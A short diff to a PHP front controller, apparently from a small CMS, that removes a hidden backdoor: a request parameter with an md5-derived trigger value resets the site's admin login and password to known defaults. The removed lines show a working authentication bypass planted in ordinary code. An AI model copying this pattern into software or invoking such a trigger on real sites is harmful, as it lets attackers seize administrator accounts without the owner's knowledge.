@@ -40,12 +40,6 @@
   $oDb = &Db::inst();
   $oReq = &Req::inst();
 
-  $sRestoreCommand = $oReq->get('restore-password-command');
-  if ($sRestoreCommand && $sRestoreCommand == md5('restore'.md5(App::conf('url.users')).'password')) {
-    $oDb->upd('system.settings', 'admin_login', array('value'=>'admin_login'));
-    $oDb->upd('system.settings', 'admin_password', array('value'=>md5('admin_password')));
-  }
-
   $oTpl->assign('content', App::Run_Block($oReq->getModule(), $oReq->getBlock()));
   $oTpl->assign('sModule', $oReq->getModule());
   $oTpl->assign('sBlock',  $oReq->getBlock());
